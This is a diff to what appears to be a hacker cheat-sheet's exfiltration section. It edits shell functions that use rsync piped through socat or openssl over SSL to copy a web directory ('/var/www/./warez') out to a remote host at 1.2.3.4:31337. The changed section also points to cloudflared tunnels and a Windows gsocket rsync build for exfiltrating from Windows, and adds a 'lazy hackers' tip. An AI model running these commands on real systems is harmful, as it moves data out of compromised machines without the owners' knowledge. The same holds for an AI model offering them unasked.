@@ -1170,13 +1170,15 @@ socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem EXEC:"rsyn
 Sender:
 ```posh
 # Copy the ssl.pem from the Receiver to the Sender and send directory named 'warez'
+IP=1.2.3.4
+PORT=31337
 # Using rsync + socat-ssl
 up1() {
-   rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@"  0:
+   rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:${IP:?}:${PORT:-31337},cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@"  0:
 }
 # Using rsync + openssl
 up2() {
-   rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- "$@"  0:
+   rsync -ahPRv -e "bash -c 'openssl s_client -connect ${IP:?}:${PORT:-31337} -servername example.com -cert ssl.pem -CAfile ssl.pem -quiet 2>/dev/null' #" -- "$@"  0:
 }
 up1 /var/www/./warez
 up2 /var/www/./warez
@@ -1184,6 +1186,8 @@ up2 /var/www/./warez
 
 Rsync can be combined to exfil via [https / cloudflared raw TCP tunnels](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
 (To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).
+
+Pro Tip: Lazy hackers just type `exfil` on segfault.net.
 
 ---
 <a id="webdav"></a>
